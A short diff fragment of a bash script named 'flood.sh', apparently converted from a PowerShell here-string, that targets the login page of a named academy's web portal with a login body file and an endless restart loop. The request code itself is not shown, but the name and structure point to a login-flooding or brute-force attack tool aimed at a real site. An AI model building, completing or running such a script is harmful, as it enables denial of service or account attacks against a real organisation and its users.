@@ -1,4 +1,3 @@
-@'
 #!/bin/bash
 TARGET="https://eportal.mabest-academy.com/login.php"
 BODY="/app/login.txt"
@@ -19,4 +18,3 @@ while true; do
   echo "[$(date)] batch done, restarting"
   sleep 1
 done
-'@ | Out-File -Encoding ascii flood.sh
